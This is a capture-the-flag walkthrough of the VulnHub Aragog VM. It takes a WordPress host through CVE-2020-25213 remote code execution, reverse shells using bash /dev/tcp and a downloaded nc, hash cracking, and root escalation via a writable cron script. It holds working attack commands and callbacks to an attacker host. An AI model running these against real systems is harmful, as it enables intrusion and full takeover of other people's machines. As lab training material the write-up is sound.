# HarryPotter: Aragog(1.0.2) (VulnHub) - Walkthrough

## Description
Aragog is the 1st VM of 3-box HarryPotter VM series in which you need to find 2 horcruxes hidden inside the machine (total 8 horcruxes hidden across 3 VMs of the HarryPotter Series) and ultimately defeat Voldemort.

- **Machine:** [HarryPotter: Aragog (1.0.2)](https://www.vulnhub.com/entry/harrypotter-aragog-102,688/)
- **Author:** Mansoor R (@time4ster)
- **Difficulty:** Easy
- **Target:** `192.168.88.15`
- **Attacker:** `192.168.88.18`
- **Goal:** capture both horcruxes

> Tested in an isolated lab on a VM I own. Attacker-side commands are transcribed
> from my shell history; long tool output is trimmed to the relevant lines.

---

## 1. Reconnaissance

Started by confirming the host was up, then ran a service/version scan.

```bash
ping 192.168.88.15
nmap -sV -sC -v 192.168.88.15
```

Two ports were open:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

I checked both versions against the exploit database, but neither had anything
useful for this box.

```bash
searchsploit OpenSSH 7.9p1
searchsploit Apache httpd 2.4.38
```

I fingerprinted the web server as well.

```bash
whatweb 192.168.88.15:80
```

Port 80 was the way in. Opening it in a browser showed only a full-screen image
with no text or links, so I moved to directory enumeration.

```bash
dirb http://192.168.88.15:80
```

`dirb` found `/blog` almost immediately.

---

## 2. WordPress enumeration

Browsing to `http://192.168.88.15:80/blog` confirmed a WordPress installation.
A first, default WPScan pass gave little to work with.

```bash
wpscan --url http://192.168.88.15:80/blog
```

```bash
wpscan --url http://192.168.88.15/blog/ --enumerate ap --plugins-detection aggressive --plugins-version-detection aggressive
```

The scan identified WordPress **5.0.12** and two plugins were identified:

- a plugin with no immediately useful exploit (`searchsploit akismet` returned
  nothing actionable),
- **wp-file-manager**, running an outdated version.

```bash
searchsploit wp-file-manager
```

The version in use is vulnerable to an **unauthenticated arbitrary file upload
leading to RCE** (CVE-2020-25213). I pulled the public PoC.

```bash
searchsploit -m php/webapps/51224.py
```

---

## 3. Exploitation - CVE-2020-25213

The PoC takes a URL and a command as arguments. First I read the script and ran a
simple test.

```bash
python 51224.py http://192.168.88.15:80/blog id
```

Command execution confirmed. The command runs in the context of the web server
user.

```bash
python 51224.py http://192.168.88.15:80/blog whoami
python 51224.py http://192.168.88.15:80/blog "cat /etc/passwd"
```

With a valid user list, I tried to get a real interactive shell instead of
running one command at a time. The classic bash `/dev/tcp` one-liner did not
work here - the command wrapper did not give a usable reverse shell.

```bash
nc -lvp 4444
```

```bash
python 51224.py http://192.168.88.15:80/blog "bash -i >& /dev/tcp/192.168.88.18/4444 0>&1"
python 51224.py http://192.168.88.15:80/blog "exec bash -i >& /dev/tcp/192.168.88.18/4444 0>&1"
```

`wget` was present, so I downloaded a static `nc` binary to the target, made it
executable, and used it to call back.

```bash
python 51224.py http://192.168.88.15:80/blog "which wget"
python 51224.py http://192.168.88.15:80/blog "wget https://raw.githubusercontent.com/yunchih/static-binaries/master/nc -O nc"
python 51224.py http://192.168.88.15:80/blog "chmod +x nc"
```

Listener on the attacking host:

```bash
nc -lvp 4444
```

Then the callback:

```bash
python 51224.py http://192.168.88.15:80/blog "./nc 192.168.88.18 4444 -e /bin/bash"
```

I now had a shell on the box.


---

## 4. Credential recovery and first horcrux

Inside the host, `/etc/wordpress` contained a configuration file with the
database credentials.

```bash
cat /etc/wordpress/config-default.php
```

```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wordpress');
define('DB_PASSWORD', '<database-password>');
define('DB_HOST', 'localhost');
```

Using those credentials against the local MySQL instance, I enumerated the
WordPress users table and found the `hagrid98` account with its password hash.

```
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| hagrid98   | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. |
+------------+------------------------------------+
```

I confirmed the hash type with `hashid`
```bash
hashid '$P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc.'
```

The hash format was phpBB/WordPress phpass. I saved it and cracked it offline
with John the Ripper against `rockyou.txt`.

```bash
echo '$P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc.' > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

John recovered the plaintext password. I logged in as `hagrid98` over SSH.

```bash
ssh hagrid98@192.168.88.15
```

In the home directory was the first horcrux.

```bash
cat horcrux1.txt
```

`/home/hargrd98/horcrux1.txt`:

```
horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
```

Base64-decoded on the attacker machine:

```bash
echo "MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==" | base64 -d
```

```
1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets
```

**Horcrux 1 captured.**

---

## 5. Privilege escalation

The second horcrux was not reachable with my current privileges, which suggested
it was in `/root`.


What mattered came from manual inspection: a backup script in `/opt`.

```bash
cat /opt/.backup.sh
```

```bash
#!/bin/bash
cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
```

The destination directory was owned by `root`, which means the script runs as
**root** - most likely from a cron job. The critical detail was the script's
permissions: it was owned/writable by my user, so root was executing a file I
could modify.

```bash
ls -l /opt/.backup.sh
ls -ld /tmp/tmp_wp_uploads
```

```
drwxr-xr-x 2 root root ... /tmp/tmp_wp_uploads
```

I appended a payload that copies `bash` and sets the SUID bit on it.

```bash
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /opt/.backup.sh
cat /opt/.backup.sh
```

```bash
#!/bin/bash
cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads
cp /bin/bash /tmp/bash && chmod +s /tmp/bash
```

After the scheduled job ran, the SUID copy appeared in `/tmp`.

```bash
ls -la /tmp/bash
```

```
-rwsr-sr-x 1 root root ... /tmp/bash
```

The `s` in the owner-execute position confirms SUID. Running it with `-p` keeps
the effective UID:

```bash
/tmp/bash -p
```

```
root@aragog:~#
```

Root. The second horcrux was in `/root`.

```bash
cat /root/horcrux2.txt
```

```
      ____                            _         _       _   _                 
     / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
    | |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
    | |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
     \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                      |___/                                                   

    Machine Author: Mansoor R (@time4ster)
    Machine Difficulty: Easy
    Machine Name: Aragog 
    Horcruxes Hidden in this VM: 2 horcruxes

    You have successfully pwned Aragog machine.
    Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}
```

Base64-decoded:

```bash
echo "MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=" | base64 -d
```

```
2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre
```

**Horcrux 2 captured.**

---

## 6. Summary of findings

| # | Finding | Severity | Impact |
|---|---------|----------|--------|
| 1 | Outdated **wp-file-manager** plugin (CVE-2020-25213) | Critical | Unauthenticated RCE as the web user |
| 2 | Readable WordPress config exposing DB credentials | High | Database access and credential exposure |
| 3 | Weak user password cracked from `rockyou.txt` | High | Account takeover |
| 4 | Root-executed script writable by a low-privileged user | Critical | Privilege escalation to root |

### Attack path

```
nmap (22, 80) → /blog (WordPress) → outdated wp-file-manager
  → CVE-2020-25213 unauthenticated RCE → shell as web user
  → DB creds in /etc/wordpress/config-default.php → dump wp_users
  → crack hagrid98 hash with John → SSH as hagrid98 → horcrux1
  → writable root backup script /opt/.backup.sh → SUID bash
  → root → horcrux2
```

---

## 7. Takeaways

A short but complete chain: an outdated plugin gave unauthenticated code
execution, a readable config leaked database credentials, a weak password turned
that into a user account, and a single writable root cron script finished the
job. Each weakness is common on its own - the damage comes from chaining them.
